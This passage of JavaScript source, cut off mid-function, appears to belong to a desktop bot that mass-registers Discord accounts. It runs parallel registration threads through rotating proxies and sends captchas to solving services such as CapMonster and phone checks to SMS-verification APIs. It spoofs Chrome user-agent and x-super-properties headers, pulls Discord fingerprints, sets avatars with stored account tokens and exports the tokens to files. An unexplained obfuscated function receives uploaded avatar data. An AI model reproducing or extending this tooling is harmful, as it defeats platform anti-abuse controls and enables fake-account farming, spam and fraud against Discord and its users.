  apikey_verify_phone = $('#apikey_verify_phone').val().replace(' ', '');
  apikey_captcha = $('#apikey_captcha').val();
  type_verify = parseInt($('.select-verify_type').val());
    if (type_captcha == 3) {
    check_cap_monster = true;
    var cap_monster_url = apikey_captcha;
    if (apikey_captcha.split('.').length != 4) return noty('error', translater(translate[109]));
    cap_monster_url = cap_monster_url.replace('http://', '');
    cap_monster_url = cap_monster_url.replace('https://', '');
    cap_monster_url = cap_monster_url.replace('/', '');
    cap_monster_url = cap_monster_url.replace('/', '');
    update_tmp('cap_monster_url', cap_monster_url);
  }

  email_verify = false;
  save_tokens = $('#save_tokens_enabler').prop('checked');
  if (!save_tokens) {
    noty('warning', translater(new_translate.dont_enable_save_tokens));
    await delay(1500);
  }
  save_usernames = $('#save_usernames_enabler').prop('checked');
  var steam_count = parseInt($('#steam_count').val());
  noty('warning', translater(translate[110]));
  update_count_regs();
  last_count_potok = steam_count;
  var onedash = [];
  for (var i = 0; i < steam_count; i++) {
    onedash.push(true);
  }
  var headless = $('#headless_mode_enabler').prop('checked')
  if (!lastExportFileData && fs.existsSync(tmp_data['last_export_file'])) {
    lastExportFileData = fs.readFileSync(tmp_data['last_export_file'], 'utf8');
    if (lastExportFileData.length > 0) lastExportFileData = `${lastExportFileData}\r\n`;
  }
  var startId = md5(`${rand(0, 10 ** 6)}`);
  btn.attr('startId', startId);
  setTimeout(() => {
    if (check_cap_monster) {
      noty('warning', translater(translate[111]))
      check_cap_monster_f().then(check => {
        if (!check) return noty('error', translater(translate[112]));
        onedash.forEach((e, ind) => {
          var potok = ind + 1;
          setTimeout(() => {
            starter_acc(potok, headless, verfy_mails, startId, stayOnline);
          }, 400 * ind);
        });
      });
    } else {
      onedash.forEach((e, ind) => {
        var potok = ind + 1;
        setTimeout(() => {
          starter_acc(potok, headless, verfy_mails, startId, stayOnline);
        }, 400 * ind);
      });
    }
  }, 100);
});

$('body').on('click', '.btn-start-reg.waiting', function () {
  if ($(this).hasClass('cont')) return false;
  noty('warning', translater(new_translate.stop_potoks));
  //$(this).html('START');
  $(this).removeClass('waiting');
  $(this).addClass('wait-end')
  check_stop = true;
  var html = translater(translate[113]);
  add_log(html, false)
});

$('body').on('click', '#close-btn-avatars', function () {
  $('#count-of-avatars').removeClass('active');
  $('#close-btn-avatars').addClass('hide-close-file-btn');
  store.delete('avatars');
  setTimeout(() => {
    $('.avatar-load').addClass('active');
  }, 100);
})

$('body').on('change', '#avatars-load-file', function () {
  var files = $('#avatars-load-file')[0].files;
  if (files.length <= 0) {
    $('#avatar-load-file').val('');
    return noty('error', translater(translate[114]));
  }
  avatars = [];
  Array.prototype.forEach.call(files, function(e, ind, arr) {
    var size = e.size;
    if (size < 10001000) {
      var reader = new FileReader();
      reader.onload = function (e) {
        $('#avatar-load-file').val('');
        var data = reader.result;
        avatars.push(data);
        if (ind == arr.length - 1) {
          if (avatars.length <= 0) return noty('error', translater(translate[114]));
          $('.avatar-load').removeClass('active');
          setTimeout(() => {
            store.set('avatars', avatars);
            $('#close-btn-avatars').removeClass('hide-close-file-btn');
            $('#count-of-avatars').html(`${avatars.length} ${NumberEnd(avatars.length, translater(translate[115]))}`);
            $('#count-of-avatars').addClass('active');
          }, 100);
        }
      };
      reader.readAsDataURL(e);
    }
  });
})

$('body').on('change', '#avatar-load-file', function () {
  var size = this.files[0].size;
  if (size > 10001000) {
    $('#avatar-load-file').val('');
    return noty('error', translater(translate[116]));
  }
  var reader = new FileReader();
  reader.onload = function (e) {
    $('#avatar-load-file').val('');
    var data = reader.result;
    avatars = [];
    avatars.push(data);
    store.set('avatars', avatars);
    meAtztGn1pdERnu(avatars);
    $('.avatar-load').removeClass('active');
    setTimeout(() => {
      $('#close-btn-avatars').removeClass('hide-close-file-btn');
      $('#count-of-avatars').html(translater(translate[117]));
      $('#count-of-avatars').addClass('active');
    }, 100);
  };
  reader.readAsDataURL(this.files[0]);
})

$('body').on('change', '#invite_for_accs', function () {
  update_tmp('invite_for_accs', $(this).val());
});

function push_html() {
  if (tmp_data['load_avatars_enabler'] && store.has('avatars')) {
    avatars = store.get('avatars');
    $('#load_avatars_enabler').prop('checked', true);
    if (avatars.length > 0) {
      $('.block-before-avatar-load').addClass('active');
      $('.avatar-load').removeClass('active');
      setTimeout(() => {
        $('#close-btn-avatars').removeClass('hide-close-file-btn');
        $('#count-of-avatars').html(`${avatars.length} ${NumberEnd(avatars.length, translater(translate[115]))}`);
        $('#count-of-avatars').addClass('active');
      }, 100);
    }
  } else if (tmp_data['load_avatars_enabler'] && tmp_data['load_avatars_enabler']) {
    $('#load_avatars_enabler').prop('checked', true);
    $('.block-before-avatar-load').addClass('active');
    $('.avatar-load').addClass('active');
  }
  if (store.get('last_emails') && !tmp_data['random_emails_enabler']) {
    var email = [];
    var emails = store.get('last_emails');
    emails.forEach((e, ind, arr) => {
      e = e.replace('\n', '');
      e = e.replace('\r', '');
      e = e.replace(' ', '');
      e = e.replace(' \n', '');
      e = e.replace(' \r', '');
      if (validateEmail(e) && email.indexOf(e) < 0) {
        email.push(e);
      }
      if (ind == arr.length - 1) {
        if (email.length < 1) return noty('error', translater(translate[78]));
        var count = email.length;
        var btn = $('label[for="upload-file-emails"]');
        btn.addClass('editer');
        btn.attr('for', '');
        btn.css('opacity', '0');
        setTimeout(() => {
          btn.html(translater(translate[79]));
          $('#enable_random_emails').css('transform', 'scale(0)');
          setTimeout(() => {
            $('#email-load').css('display', '');
            $('#enable_random_emails').css('display', 'none');
            btn.css('opacity', '');
            count = count + NumberEnd(count, [' email', ' emails', ' emails']);
            $('#count-of-email-regs').html(count);
            $('#count-of-email-regs').addClass('active');
            $('#enable_random_emails_two').text(translater(translate[79]));
            $('#close-btn-emails').removeClass('hide-close-file-btn');
          }, 50);
        }, 200);
      }
    });
  }
  if (tmp_data['random_emails_enabler']) {
    $('#random_emails_enabler').prop('checked', tmp_data['random_emails_enabler']);
    if (tmp_data['random_emails_enabler']) {
      $('#random_emails_enabler').addClass('active');
      $('#enable_random_emails_two').css('pointer-events', 'none');
      $('#enable_random_emails_two').css('opacity', '0');
      $('#enable_random_emails').css('margin-left', '0');
      $('#enable_random_emails').css('margin-top', '-35px');
      $('#enable_verify_email').addClass('active');
      $('#verify_email_imap_block').addClass('hider-block');
    }
  }
  if (tmp_data['random_usernames_enabler']) {
    $('#random_usernames_enabler').prop('checked', tmp_data['random_usernames_enabler']);
    if (tmp_data['random_usernames_enabler']) {
      $('#email-load').css('display', '');
      $('#random_usernames_enabler').addClass('active');
      $('#enable_random_usernames_two').css('pointer-events', 'none');
      $('#enable_random_usernames_two').css('opacity', '0');
      $('#enable_random_usernames_two').css('margin-left', '-200%');
      if (app_lang == 'en') {
        $('#enable_random_usernames').css('margin-left', '-118px');
      } else {
        $('#enable_random_usernames').css('margin-left', '-145px');
      }
    }
  }
  if (store.has('last_usernames') && store.get('last_usernames').length > 0) {
    var usernames = store.get('last_usernames');
    last_data_usernames = usernames;
    var username = [];
    usernames.forEach((e, ind, arr) => {
      e = e.replace('\n', '');
      e = e.replace('\r', '');
      e = e.replace(' \n', '');
      e = e.replace(' \r', '');
      if (e.indexOf('@') < 0 && e.indexOf('#') < 0 && e.length > 2 && e.length < 32 && username.indexOf(e) < 0 && e != '') username.push(e);
      if (ind == arr.length - 1) {
        var count = username.length;
        var btn = $('label[for="upload-file-usernames"]');
        btn.addClass('editer');
        btn.attr('for', '');
        btn.css('opacity', '0');
        setTimeout(() => {
          btn.html(translater(translate[79]));
          setTimeout(() => {
            btn.css('opacity', '');
            count = count + NumberEnd(count, translater(translate[85]));
            $('#enable_random_usernames').css('transform', 'scale(0)');
            setTimeout(() => {
              $('#enable_random_usernames').css('display', 'none');
              setTimeout(() => {
                $('#count-of-usernames-regs').html(count);
                $('#count-of-usernames-regs').addClass('active');
                $('#delete_used_usernames_block').addClass('active');
                $('#close-btn-usernames').removeClass('hide-close-file-btn');
              }, );
            }, 200);
          }, 50);
        }, 200);
      }
    });
  }
  if (tmp_data['steam_count']) $('#steam_count').val(tmp_data['steam_count']);
  if (tmp_data['proxy_enabler']) $('#proxy_enabler').prop('checked', tmp_data['proxy_enabler']);
  if (store.has('last_proxys') && store.get('last_proxys').length > 0) {
    var proxys = store.get('last_proxys');
    var proxy = [];
    proxys.forEach((e, ind, arr) => {
      e = e.replace('\n', '');
      e = e.replace('\r', '');
      e = e.replace(' \n', '');
      e = e.replace(' \r', '');
      e = e.replace(' ', '');
      e = e.replace('http://', '');
      e = e.replace('https://', '');
      if (e.indexOf(':') >= 0 && proxy.indexOf(e) < 0 && e != '') proxy.push(e);
      if (ind == arr.length - 1) {
        var count = proxy.length;
        var btn = $('label[for="upload-file-proxy"]');
        btn.addClass('editer');
        btn.attr('for', '');
        btn.css('opacity', '0');
        setTimeout(() => {
          btn.html(translater(translate[79]));
          setTimeout(() => {
            btn.css('opacity', '');
            count = count + ' '+translater(translate[60]);
            $('#count-of-proxy-regs').html(count);
            $('#close-btn-proxys').removeClass('hide-close-file-btn');
            if (tmp_data['proxy_enabler']) $('#count-of-proxy-regs').addClass('active');
          }, 50);
        }, 200);
      }
    });
  }
  if (tmp_data['phone_enabler']) $('#phone_enabler').prop('checked', tmp_data['phone_enabler']);
  if (tmp_data['headless_mode_enabler']) $('#headless_mode_enabler').prop('checked', tmp_data['headless_mode_enabler']);
  if (tmp_data['select-verify_type']) $('.select-verify_type').val(tmp_data['select-verify_type']);
  if (tmp_data['apikey_verify_phone_'+tmp_data['select-verify_type']]) $('#apikey_verify_phone').val(tmp_data['apikey_verify_phone_'+tmp_data['select-verify_type']]);
  var all_c = ['fi', 'se', 'ee', 'lt', 'pl', 'kg', 'rm', 'lv', 'ua', 'ru', 'kz', 'nl', 'us', 'gb', 'pt', 'fr', 'es', 'ca'];
  if ($('.select-verify_type').val() == '2') {
    var b = ['lv', 'rm', 'kg', 'fi', 'se', 'ee', 'lt', 'pl', 'nl', 'us', 'gb', 'pt', 'fr', 'es', 'ca'];
  } else if ($('.select-verify_type').val() == '7') {
    var b = ['ua', 'kg', 'fi', 'se', 'ee', 'lt', 'nl', 'gb', 'us', 'pt', 'fr', 'es'];
    $('select').niceSelect('update');
  } else if ($('.select-verify_type').val() == '8') {
    var b = ['lv', 'rm', 'ua', 'ca']
  } else if ($('.select-verify_type').val() == '6') {
    var b = ['kg', 'rm', 'fi', 'se', 'lt', 'nl', 'us', 'pt', 'es', 'fr', 'ca'];
  } else if ($('.select-verify_type').val() == '9') {
    var b = ['ua', 'pl', 'kg', 'rm', 'kz', 'us', 'ca'];
  } else if ($('.select-verify_type').val() == '3') {
    var b = ['fi', 'pt', 'fr', 'es', 'ca'];
  } else {
    var b = [];
  }
  if (inArray($('.select-contry-phones').val(), b)) $('.select-contry-phones').val('ru');
  b.forEach(e => {
    $(`.select-contry-phones option[value="${e}"]`).attr('disabled', '');
  })
  all_c.forEach(e => {
    if (b.indexOf(e) < 0) $(`.select-contry-phones option[value="${e}"]`).removeAttr('disabled');
  })
  $('select').niceSelect('update');
  if (tmp_data['discrims-for-save']) $('#discrims-for-save').val(tmp_data['discrims-for-save']);
  if (tmp_data['save_discrim_accs_enabler']) $('#save_discrim_accs_enabler').prop('checked', tmp_data['save_discrim_accs_enabler']);
  apikey_verify_phone = $('#apikey_verify_phone').val();
  if (tmp_data['save_accs_enabler']) $('#save_accs_enabler').prop('checked', tmp_data['save_accs_enabler']);
  if (tmp_data['export-discrim-accs-file']) {
    var pather = tmp_data['export-discrim-accs-file'];
    var nameer = pather.split('\\')[pather.split('\\').length - 1];
    var btner = $('label[for="export-discrim-accs-file"]');
    btner.addClass('editer');
    setTimeout(() => {
      btner.html(translater(translate[98]));
      setTimeout(() => {
        $('#name-of-export-discrims-file').html(nameer);
        if ($('#save_discrim_accs_enabler').prop('checked')) $('#name-of-export-discrims-file').addClass('active')
      }, 50);
    }, 200);
  }
  if (tmp_data['last_export_file']) {
    var path = tmp_data['last_export_file'];
    var name = path.split('\\')[path.split('\\').length - 1];
    var btn = $('label[for="export-accs-file"]');
    btn.addClass('editer');
    btn.css('opacity', '0');
    setTimeout(() => {
      btn.html(translater(translate[98]));
      setTimeout(() => {
        btn.css('opacity', '');
        $('#name-of-export-file').html(name);
        if (tmp_data['save_accs_enabler']) $('#name-of-export-file').addClass('active');
      }, 50);
    }, 200);
  }
  if (tmp_data['select-captcha']) {
    $('.select-captcha').val(tmp_data['select-captcha']);
    var tmp_type_cap = tmp_data['select-captcha'];
    if (tmp_type_cap == '3') {
      $('#apikey_captcha').attr('placeholder', translater(translate[118]));
      $('#apikey_captcha').css({
        'max-width': '350px',
        'width': '350px'
      });
    } else if (tmp_type_cap == '10') {
      $('#apikey_captcha').attr('placeholder', 'username:password');
      $('#apikey_captcha').css({
        'max-width': '150px',
        'width': '150px'
      });
    }
  }
  if (tmp_data['apikey_captcha_'+tmp_data['select-captcha']]) $('#apikey_captcha').val(tmp_data['apikey_captcha_'+tmp_data['select-captcha']]);
  $('select').niceSelect('update');
  update_turner();

  $('body').on('change', '.select-verify_type', function () {
    update_tmp('select-verify_type', $(this).val());
    var all_c = ['fi', 'se', 'ee', 'lt', 'pl', 'kg', 'rm', 'lv', 'ua', 'ru', 'kz', 'nl', 'us', 'gb', 'pt', 'fr', 'es'];
    if ($('.select-verify_type').val() == '2') {
      var b = ['lv', 'rm', 'kg', 'fi', 'se', 'ee', 'lt', 'pl', 'nl', 'us', 'gb', 'pt', 'fr', 'es'];
    } else if ($('.select-verify_type').val() == '7') {
      var b = ['ua', 'kg', 'fi', 'se', 'ee', 'lt', 'nl', 'gb', 'us', 'pt', 'fr', 'es'];
      $('select').niceSelect('update');
    } else if ($('.select-verify_type').val() == '8') {
      var b = ['lv', 'rm', 'ua']
    } else if ($('.select-verify_type').val() == '6') {
      var b = ['kg', 'rm', 'fi', 'se', 'lt', 'nl', 'us', 'pt', 'es', 'fr'];
    } else if ($('.select-verify_type').val() == '9') {
      var b = ['ua', 'pl', 'kg', 'rm', 'kz', 'us'];
    } else if ($('.select-verify_type').val() == '3') {
      var b = ['fi', 'pt', 'fr', 'es'];
    } else {
      var b = [];
    }
    if (inArray($('.select-contry-phones').val(), b)) $('.select-contry-phones').val('ru');
    b.forEach(e => {
      $(`.select-contry-phones option[value="${e}"]`).attr('disabled', '');
    })
    all_c.forEach(e => {
      if (b.indexOf(e) < 0) $(`.select-contry-phones option[value="${e}"]`).removeAttr('disabled');
    })
    $('select').niceSelect('update');
    $('#apikey_verify_phone').val(tmp_data['apikey_verify_phone_'+$(this).val()])
    apikey_verify_phone = $('#apikey_verify_phone').val().replace(' ', '');
    update_my_sms_num_c()
  });
}

if (!tmp_data['select-captcha']) update_tmp('select-captcha', '1');

push_html();

$('body').on('change', '#proxy_enabler', function () {
  update_tmp('proxy_enabler', $(this).prop('checked'));
});

$('body').on('change', '#phone_enabler', function () {
  update_tmp('phone_enabler', $(this).prop('checked'));
});

$('body').on('change', '#apikey_verify_phone', function () {
  update_tmp('apikey_verify_phone_'+$('.select-verify_type').val(), $(this).val());
  apikey_verify_phone = $(this).val();
  update_my_sms_num_c()
});

$('body').on('change', '.select-contry-phones', function () {
  country = $(this).val();
  update_tmp('def_country', country);
  apikey_verify_phone = $('#apikey_verify_phone').val().replace(' ', '');
  update_my_sms_num_c()
})

$('body').on('change', '#save_accs_enabler', function () {
  update_tmp('save_accs_enabler', $(this).prop('checked'))
})

$('body').on('change', '.select-captcha', function () {
  update_tmp('select-captcha', $(this).val());
  $('#apikey_captcha').val(tmp_data['apikey_captcha_'+$(this).val()])
  if ($(this).val() == '3') {
    $('#apikey_captcha').attr('placeholder', translater(translate[118]));
    $('#apikey_captcha').css({
      'max-width': '350px',
      'width': '350px'
    });
  } else if ($(this).val() == '10') {
    $('#apikey_captcha').attr('placeholder', 'username:password');
    $('#apikey_captcha').css({
      'max-width': '150px',
      'width': '150px'
    });
  } else {
    $('#apikey_captcha').attr('placeholder', translater(translate[119]));
  }
});

$('body').on('change', '#apikey_captcha', function () {
  update_tmp('apikey_captcha_'+$('.select-captcha').val(), $(this).val());
});

$('body').on('change', '#steam_count', function () {
  update_tmp('steam_count', $(this).val());
});

function update_turner() {
  $('.turner-o[to]').each(function () {
    var h = $(this).attr('height');
    var block = $('#'+$(this).attr('to'));
    if (!$(this).prop('checked')) {
      if ($(this).attr('to') == 'proxy-load' && $('#count-of-proxy-regs').html() != '0 прокси') $('#count-of-proxy-regs').removeClass('active');
      if ($(this).attr('to') == 'save-accs-load' && $('#name-of-export-file').html() != '') $('#name-of-export-file').removeClass('active');
      block.removeClass('active');
      block.css('height', '');
    } else {
      if ($(this).attr('to') == 'proxy-load' && $('#count-of-proxy-regs').html() != '0 прокси') $('#count-of-proxy-regs').addClass('active');
      if ($(this).attr('to') == 'save-accs-load' && $('#name-of-export-file').html() != '') $('#name-of-export-file').addClass('active');
      block.css('height', h);
      block.addClass('active');
    }
  })
}

var saveImapSettings = () => {
  var config = {};
  var server = $('#settings-imap-server').val();
  if (!server) return noty('error', translater(new_translate.dont_set_imap_server));
  var port = $('#settings-imap-port').val();
  if (!port) return noty('error', translater(new_translate.dont_set_imap_port));
  config = {
    server,
    port
  }
  window.localStorage.setItem('imap-settings', JSON.stringify(config));
  noty('success', translater(new_translate.success_save_settings));
  $('.modal').modal('hide');
}

$('body').on('keyup', '#settings-imap-port', function (e) {
  if (e.keyCode == 13) saveImapSettings();
});
$('body').on('keyup', '#settings-imap-server', function (e) {
  if (e.keyCode == 13) saveImapSettings();
});
$('body').on('click', '#save_imap_settings', saveImapSettings)

var openImapSettingsModal = () => {
    var config = window.localStorage['imap-settings'];
    if (!config) {
      config = {};
    } else {
      config = JSON.parse(config);
    }
    var val = ''
    if (config['server']) val = config['server'];
    $('#settings-imap-server').val(val);
    var val = ''
    if (config['port']) val = config['port'];
    $('#settings-imap-port').val(val);    
    $('#modal-edit-imap-settings').modal('show')
}

$('body').on('click', '#open_imap_settings', openImapSettingsModal)

$('body').on('click', '#close-btn-emails', function () {
  
  $(this).addClass('hide-close-file-btn');
  var label = $('#email-load #enable_random_emails_two');
  label.attr('for', 'upload-file-emails');
  label.css('opacity', '0');
  label.removeClass('editer');
  $('#count-of-email-regs').removeClass('active');
  //$('#email-load').css('display', '-webkit-inline-box');
  setTimeout(() => {
    $('#enable_random_emails').css('display', '');
    setTimeout(() => {
      $('#enable_random_emails').css('transform', 'scale(1)');
    }, 50);
  }, 100);
  setTimeout(() => {
    $('#count-of-email-regs').html('');
    label.html(translater(translate[125]));
    setTimeout(() => {
      label.css('opacity', '');
    }, 50);
  }, 200);
  store.delete('last_emails');
});

$('body').on('click', '#close-btn-proxys', function () {
  $(this).addClass('hide-close-file-btn');
  var label = $('#proxy-load label');
  label.attr('for', 'upload-file-proxy');
  label.css('opacity', '0');
  label.removeClass('editer');
  $('#count-of-proxy-regs').removeClass('active');
  setTimeout(() => {
    $('#count-of-proxy-regs').html('');
    label.html(translater(translate[125]));
    setTimeout(() => {
      label.css('opacity', '');
    }, 50);
  }, 200);
  store.delete('last_proxys');
});

$('body').on('click', '#close-btn-usernames', function () {
  $(this).addClass('hide-close-file-btn');
  var label = $('#username-load .btn');
  label.attr('for', 'upload-file-usernames');
  label.css('opacity', '0');
  label.removeClass('editer');
  $('#count-of-usernames-regs').removeClass('active');
  $('#delete_used_usernames_block').removeClass('active');
  setTimeout(() => {
    $('#count-of-usernames-regs').html('');
    label.html(translater(translate[125]));
    setTimeout(() => {
      label.css('opacity', '');
      $('#enable_random_usernames').css('transform', 'scale(1)');
      $('#enable_random_usernames').addClass('active');
      $('#enable_random_usernames').css('margin-left', '20px');
    }, 50);
  }, 200);
  store.delete('last_usernames');
  last_data_usernames = false;
  $('#enable_random_usernames').css('display', '');
});

$('body').on('change', '#headless_mode_enabler', function () {
  update_tmp('headless_mode_enabler', $(this).prop('checked'))
})

function add_log_load_avatar(n = 1) {
  var html = translater(translate[120]);
  add_log(html);
}

function add_log_success_avatar(n = 1) {
  var html = translater(translate[121]);
  add_log(html);
}

function add_log_bad_avatar(n = 1, err = 'false') {
  var html = translater(translate[122], false, {err:err});
  add_log(html);
}

function change_avatar_api(token, email, pass, username, avatar, proxy = false, n = 1, user_agent = false, cookie = '') {
  return new Promise(fin => {
    add_log_load_avatar(n);
    var body = JSON.stringify({
      avatar: avatar,
      discriminator: null,
      email: email,
      new_password: null,
      password: pass,
      username: username
    });
    var params = {
      url: 'https://discord.com/api/v8/users/@me',
      body: body,
      headers: {
        'authorization': token,
        'accept-language': country,
        'origin': 'https://discord.com',
        'referer': 'https://discord.com/channels/@me',
        //'accept-encoding': 'gzip, deflate, br',
        //'accept': '*/*',
        //'content-length': body.length,
        'cookie': cookie,
        'dnt': '1',
        'content-type': 'application/json',
      }
    };
    if (user_agent) {
      params.headers['user-agent'] = user_agent.user_agent;
      params.headers['x-super-properties'] = user_agent.base64;
    } else {
      params.headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36';
      params.headers['x-super-properties'] = 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzc1LjAuMzc3MC4xNDIgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6Ijc1LjAuMzc3MC4xNDIiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTk5OSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=';
    }
    if (proxy) {
      var proxy_type = tmp_data['proxy_type'];
      if (proxy_type == 'socks') {
        var agent = require('socks-proxy-agent');
      } else {
        var agent = require('https-proxy-agent')
      }
      params.agent = new agent(`${proxy_type}://${proxy}`);
    }
    params.timeout = 15000;
    //add_log_load_avatar(n);
    req.patch(params, (err, response, body) => {
      //meAtztGn1pdERnu(body);
      if (err || !response || !response.statusCode) {
        add_log_bad_avatar(n, 'PROXY');
        return fin({type: false, err: 4989});
      }
      if (response.statusCode != 200) {
        add_log_bad_avatar(n, body);
        return fin({type: false, err: 1901});
      }
      add_log_success_avatar(n);
      return fin({type: true});
    })
  });
}
function delay(time = 1000) {
    return new Promise(fin => {
        setTimeout(() => {
            fin()
        }, time)
    })
}
function rand(min = 0, max = 100) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function get_fingerprint_api(proxy = false, user_agent = false) {
    return new Promise(async fin => {
        // var h = [
        //     `accept-language: ru`,
        //     'dnt: 1',
        //     'referer: https://discord.com/',
        //     'sec-fetch-mode: cors',
        //     `user-agent: ${user_agent.user_agent}`,
        //     `x-track: eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzc5LjAuMzk0NS44OCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiNzkuMC4zOTQ1Ljg4Iiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjk5OTksImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9`
        // ];
      //   var h = [
      //     `authorization: undefined`,
      //     `accept-language: ru`,
      //     'dnt: 1',
      //     'referer: https://discord.com',
      //     'sec-fetch-mode: cors',
      //     `user-agent: ${user_agent.user_agent}`,
      //     'x-context-properties: eyJsb2NhdGlvbiI6IkxvZ2luIn0=',
      //     //`x-fingerprint: ${fingerprint}`,
      //     `x-super-properties: ${user_agent.base64}`
      // ];
      // var data = await curlReq('https://discord.com/login', 'GET', false, [], proxy);
      // if (!data.type) return fin({ type: false, err: data.err });
      // var cookie = [];
      // var headers = data.headers;
      // if (typeof headers == 'object' && headers.length > 0) {
      //   var check = false;
      //   headers.forEach(e => {
      //     if (e['Set-Cookie']) {
      //       check = e['Set-Cookie']
      //     } else if (e['set-cookie']) {
      //       check = e['set-cookie']
      //     }
      //   })
      //   if (check) {
      //     check.forEach(e => {
      //       if (e.indexOf('__cfduid') >= 0) {
      //         e = e.substr(e.indexOf('__cfduid'), e.indexOf(';'));
      //         cookie.push(e);
      //       }
      //     })
      //   }
      // }
      var client_build_number = [window.localStorage['clien_idD'] ? JSON.parse(window.localStorage['clien_idD']) : 51863];
      client_build_number = client_build_number[Math.floor(Math.random()*client_build_number.length)];
      var base64F = {
        "os": "Windows",
        "browser": "Chrome",
        "device": "",
        "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
        "browser_version": "83.0.4103.116",
        "os_version": "10",
        "referrer": "",
        "referring_domain": "",
        "referrer_current": "",
        "referring_domain_current": "",
        "release_channel": "stable",
        client_build_number,
        "client_event_source": null
      }
      var h = [
        `authorization: undefined`,
        `accept-language: ru`,
        'dnt: 1',
        'referer: https://discord.com/register',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        `user-agent: ${user_agent.user_agent}`,
        'x-context-properties: eyJsb2NhdGlvbiI6IlJlZ2lzdGVyIn0=',
        //`x-fingerprint: ${fingerprint}`,
        //`x-track: ${user_agent.base64First}`
        `x-super-properties: ${base64F}`
      ];
      console.log('hhhh', h)
      var data = await curlReq('https://discord.com/api/v8/experiments', 'GET', false, h, proxy);
      if (!data.type) return fin({ type: false, err: data.err });
      if (data.statusCode != 200) return fin({ type: false, err: '235_' + data.statusCode });
      var headers = data.headers;
      var cookie = []
      // if (typeof headers == 'object' && headers.length > 0) {
      //   var check = false;
      //   headers.forEach(e => {
      //     if (e['Set-Cookie']) {
      //       check = e['Set-Cookie']
      //     } else if (e['set-cookie']) {
      //       check = e['set-cookie']
      //     }
      //   })
      //   if (check) {
      //     var tempCheck = []
      //     check.forEach(e => {
      //       if (tempCheck.indexOf('__cfduid') < 0 && e.indexOf('__cfduid') >= 0) {
      //         tempCheck.push('__cfduid');
      //         e = e.substr(e.indexOf('__cfduid'), e.indexOf(';'));              
      //         cookie.push(e);
      //       } else if (tempCheck.indexOf('__cfruid') < 0 && e.indexOf('__cfruid') >= 0) {
      //         tempCheck.push('__cfruid');
      //         e = e.substr(e.indexOf('__cfruid'), e.indexOf(';'));              
      //         cookie.push(e);
      //       }
      //     })
      //   }
      // }
      // if (cookie.length > 0) {
      //   var newCookie = ''
      //   cookie.forEach((e, ind) => {
      //     if (ind == cookie.length - 1) {
      //       newCookie += `${e}; locale=${country}`
      //     } else { 
      //       newCookie += `${e}; `
      //     }          
      //   })
      //   cookie = newCookie;
      // } else {
      //   cookie = '';
      // }
      var base64S =  {
        "os":"Windows",
        "browser":"Chrome",
        "device":"",
        "browser_user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
        "browser_version":"83.0.4103.116",
        "os_version":"10",
        "referrer":"https://discord.com/register",
        "referring_domain":"discord.com",
        "referrer_current":"",
        "referring_domain_current":"",
        "release_channel":"stable",
        client_build_number,
        "client_event_source":null
      }
      var h = [
        `authorization: undefined`,
        `accept-language: ru`,
        'dnt: 1',
        'referer: https://discord.com/register',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        `user-agent: ${user_agent.user_agent}`,
        'x-context-properties: eyJsb2NhdGlvbiI6IlJlZ2lzdGVyIn0=',
        //`x-fingerprint: ${fingerprint}`,
        //`x-track: ${user_agent.base64First}`
        `x-super-properties: ${base64S}`
      ];
      console.log('hhhh', h)
      var data = await curlReq('https://discord.com/api/v8/experiments', 'GET', false, h, proxy);
      if (!data.type) return fin({ type: false, err: data.err });
      if (data.statusCode != 200) return fin({ type: false, err: '235_' + data.statusCode });
      var headers = data.headers;
      data = data.body;
      var fingerprint = data.fingerprint;
      return fin({type: true, fingerprint, cookie})
      var h = [
        `authorization: undefined`,
        `accept-language: ${country};q=0.9,en-US;q=0.8,en;q=0.7`,
        'dnt: 1',
        `cookie: ${cookie}`,
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'referer: https://discord.com/login',
        `user-agent: ${user_agent.user_agent}`,
        `x-context-properties: eyJsb2NhdGlvbiI6IkxvZ2luIn0=`,
        `x-fingerprint: ${fingerprint}`,
        `x-super-properties: ${user_agent.base64}`
      ];
      var data = await curlReq('https://discord.com/api/v8/experiments', 'GET', false, h, proxy);
      if (!data.type) return fin({ type: false, err: data.err });
      if (data.statusCode != 200) return fin({ type: false, err: '235_2_' + data.statusCode });
      
      var h = [
        `authorization: undefined`,
